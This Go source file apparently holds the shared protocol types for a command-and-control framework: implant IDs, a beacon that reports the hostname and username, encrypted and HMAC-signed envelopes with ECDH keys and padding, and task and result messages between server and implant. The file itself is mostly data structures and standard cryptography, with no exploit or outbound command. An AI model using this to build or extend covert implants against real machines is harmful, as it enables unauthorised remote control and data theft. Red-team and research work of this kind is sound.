package shared

import (
	"crypto/hmac"
	"crypto/rand"
	"crypto/sha256"
	"encoding/hex"
)

// ChunkSize is the maximum bytes per file transfer chunk.
const ChunkSize = 512 * 1024 // 512 KB

// GenerateID returns a random 16-byte hex string used as the implant ID.
func GenerateID() string {
	b := make([]byte, 16)
	if _, err := rand.Read(b); err != nil {
		panic("crypto/rand failed: " + err.Error())
	}
	return hex.EncodeToString(b)
}

// Beacon is the implant's check-in payload, encrypted and sent to the server.
type Beacon struct {
	ID       string `json:"id"`
	Hostname string `json:"hostname"`
	Username string `json:"username"`
	OS       string `json:"os"`
	Arch     string `json:"arch"`
}

// Envelope is the outer wrapper sent over the wire. ID identifies the implant
// (omitted on initial beacon where PubKey is present instead). PubKey carries
// the implant's ephemeral ECDH public key (hex-encoded) on the initial check-in.
// Nonce and Ciphertext hold the AES-256-GCM encrypted inner payload.
type Envelope struct {
	ID         string `json:"id,omitempty"`
	PubKey     string `json:"pub_key,omitempty"`
	Nonce      string `json:"nonce"`
	Ciphertext string `json:"ciphertext"`
	Pad        string `json:"p,omitempty"`
	Token      string `json:"t,omitempty"`
}

// Task is sent from the server to the implant.
type Task struct {
	ID   string `json:"id"`
	Type string `json:"type"`
	Args string `json:"args"`
}

// TaskResult is sent from the implant to the server.
type TaskResult struct {
	TaskID  string `json:"task_id"`
	Success bool   `json:"success"`
	Output  string `json:"output"`
	Type    string `json:"type,omitempty"`
}

// SignEnvelope computes HMAC-SHA256 of the Ciphertext field keyed by authToken
// and sets Envelope.Token. If authToken is empty, no-op.
func SignEnvelope(env *Envelope, authToken string) {
	if authToken == "" {
		return
	}
	mac := hmac.New(sha256.New, []byte(authToken))
	mac.Write([]byte(env.ID))
	mac.Write([]byte(env.PubKey))
	mac.Write([]byte(env.Nonce))
	mac.Write([]byte(env.Ciphertext))
	env.Token = hex.EncodeToString(mac.Sum(nil))
}

// VerifyEnvelope checks the HMAC-SHA256 token. Returns true if authToken is
// empty (auth disabled) or if the token is valid.
func VerifyEnvelope(env *Envelope, authToken string) bool {
	if authToken == "" {
		return true
	}
	expected := hmac.New(sha256.New, []byte(authToken))
	expected.Write([]byte(env.ID))
	expected.Write([]byte(env.PubKey))
	expected.Write([]byte(env.Nonce))
	expected.Write([]byte(env.Ciphertext))
	got, err := hex.DecodeString(env.Token)
	if err != nil {
		return false
	}
	return hmac.Equal(got, expected.Sum(nil))
}
